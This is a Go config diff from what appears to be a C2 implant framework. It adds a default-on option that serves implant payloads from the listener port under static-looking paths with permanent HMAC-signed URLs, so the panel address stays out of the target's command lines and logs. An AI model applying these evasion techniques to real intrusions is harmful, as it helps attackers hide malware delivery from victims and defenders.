@@ -366,6 +366,24 @@ type ListenerConfig struct {
 	// **不能**把它当中继/鉴权用：Host 头是明文可控的，知道域名的人照样能伪造；
 	// 它挡的是"无目标的批量扫描"，不是定向攻击。
 	WSHostAllowlist []string `mapstructure:"ws_host_allowlist" json:"ws_host_allowlist"`
+
+	// ─── 载荷托管到监听器端口（v1.4.3 #15b-B）────────────────────────────
+	//
+	// 背景：一条命令上线里的下载地址长期是 `http://<面板>:<面板端口>/api/v1/implant/
+	// payload/build-xxx`，直接把面板入口和接口路径写进了目标机的命令行/日志。开启后
+	// 载荷改由**监听器端口**按 `<prefix>/<token>/<文件名>` 下发，URL 里既不出现面板
+	// 端口，也不出现 `/api/v1`，与 C2 通道同域同端口（更像静态资源）。
+	//
+	// token = hex(HMAC-SHA256(密钥, "payload:"+buildID))[:12]，由 buildID 决定 →
+	// **同一个载荷的 URL 永久稳定、可重复下载**（服务端重启后也一致），且不落库。
+	// 密钥取 listener.encryption_key；未配置时退回 auth.jwt_key。
+	PayloadHostEnabled bool `mapstructure:"payload_host_enabled" json:"payload_host_enabled"`
+	// PayloadHostPrefix 第一段路径，建议起个伪静态目录名（s / static / assets / dl）。
+	// 只允许 [A-Za-z0-9._-]，空 = 使用 "s"。
+	PayloadHostPrefix string `mapstructure:"payload_host_prefix" json:"payload_host_prefix"`
+	// PayloadURLTTL 托管下载的签名有效期（秒）。**0 = 永久有效（默认）**，
+	// 与"确保可以重复使用"的要求一致；非 0 时超过 TTL 返回 410。
+	PayloadURLTTL int `mapstructure:"payload_url_ttl" json:"payload_url_ttl"`
 }
 
 type ImplantConfig struct {
@@ -842,6 +860,11 @@ func Load(configPath string) (*Config, error) {
 	// 所以这里直接引用 transport 的常量而不是再抄一遍字面量（抄一遍就会漂移）。
 	viper.SetDefault("listener.ws_path", transport.DefaultUpgradePath)
 	viper.SetDefault("listener.ws_host_allowlist", []string{})
+	// 载荷托管（v1.4.3 #15b-B）：默认开启，路径取 /s/<token>/<文件名>，
+	// TTL=0 表示永久有效、可重复下载。想回到"从面板端口下载"就把它设成 false。
+	viper.SetDefault("listener.payload_host_enabled", true)
+	viper.SetDefault("listener.payload_host_prefix", "s")
+	viper.SetDefault("listener.payload_url_ttl", 0)
 
 	viper.SetDefault("implant.interval", 60)
 	// 抖动默认 20%（不是 10%）：与「生成载荷」能力接口对外声明的默认值、
